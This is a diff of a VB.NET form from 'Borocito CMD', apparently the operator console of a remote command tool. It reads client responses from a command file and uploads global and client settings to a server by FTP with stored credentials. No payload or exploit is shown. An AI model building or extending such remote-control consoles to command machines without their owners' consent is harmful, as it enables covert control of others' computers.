@@ -2,13 +2,14 @@
     Dim IsThreadReadCMDServerRunning As Boolean = False
     Dim ThreadReadCMDServer As Threading.Thread = New Threading.Thread(New Threading.ThreadStart(AddressOf ReadCommandFile))
     Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        CheckForIllegalCrossThreadCalls = False
         TabPage5.Enabled = False
         Panel1.Dock = DockStyle.Fill
     End Sub
     Private Sub Main_HelpRequested(sender As Object, hlpevent As HelpEventArgs) Handles Me.HelpRequested
         If MessageBox.Show("Borocito CLI y Borocito CMD fueron creados por Zhenboro." & vbCrLf & "¿Desea visitar el sitio oficial?", "Borocito Series", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = DialogResult.Yes Then
             Process.Start("https://github.com/Zhenboro/Borocito")
-            Threading.Thread.Sleep(1500)
+            Threading.Thread.Sleep(1000)
             Process.Start("https://github.com/Zhenboro")
         End If
     End Sub
@@ -17,7 +18,6 @@
     End Sub
     Sub LoadIt()
         Try
-            CheckForIllegalCrossThreadCalls = False
             Panel1.Visible = True
             LoaderTimer.Stop()
             LoaderTimer.Enabled = False
@@ -107,6 +107,7 @@
                     SetCMDStatus(Nothing, "The response is equal by last")
                 Else
                     LastUserResponse = TheResponse
+                    'quizas un if LastUserResponse <> nothing para que corra la siguiente linea, asi evitar las respuestas "fantasma"... BOO
                     SetCMDStatus(vbCrLf & "Client: " & LastUserResponse, Nothing)
                 End If
             End While
@@ -187,24 +188,32 @@
             End If
         End If
     End Sub
-
     Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
+        Try
+            Dim LocalFilePath As String = DIRCommons & "\GlobalSettings.ini"
+            Dim RemoteFilePath As String = HttpOwnerServer & "/GlobalSettings.ini"
+            If My.Computer.FileSystem.FileExists(LocalFilePath) Then
+                My.Computer.FileSystem.DeleteFile(LocalFilePath)
+            End If
+            My.Computer.FileSystem.WriteAllText(LocalFilePath, RichTextBox4.Text, False)
+            My.Computer.Network.UploadFile(LocalFilePath, RemoteFilePath, HostOwnerServerUser, HostOwnerServerPassword)
+            MsgBox("Global Settings aplicado.", MsgBoxStyle.Information, "Configuracion Servidor")
+        Catch ex As Exception
+            AddToLog("SendGlobalSettings@Main", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
         Try
             Dim LocalFilePath As String = DIRCommons & "\ClientConfig.ini"
             Dim RemoteFilePath As String = HostOwnerServer & "/Client.ini"
             If My.Computer.FileSystem.FileExists(LocalFilePath) Then
                 My.Computer.FileSystem.DeleteFile(LocalFilePath)
             End If
-            My.Computer.FileSystem.WriteAllText(LocalFilePath, "# Borocito Updater Client Information" &
-                vbCrLf & "[Assembly]" &
-                vbCrLf & "Assembly=" & ComboBox2.Text &
-                vbCrLf & "Version=" & ComboBox3.Text &
-                vbCrLf & "[Updates]" &
-                vbCrLf & "Binaries=" & ComboBox4.Text, False)
+            My.Computer.FileSystem.WriteAllText(LocalFilePath, RichTextBox5.Text, False)
             My.Computer.Network.UploadFile(LocalFilePath, RemoteFilePath, HostOwnerServerUser, HostOwnerServerPassword)
-            MsgBox("Configuracion cliente actualizado correctamente.", MsgBoxStyle.Information, "Configuracion cliente")
+            MsgBox("Client Settings aplicado.", MsgBoxStyle.Information, "Configuracion Servidor")
         Catch ex As Exception
-            AddToLog("SendCommandFile@Main", "Error: " & ex.Message, True)
+            AddToLog("SendClientSettings@Main", "Error: " & ex.Message, True)
         End Try
     End Sub
 End Class
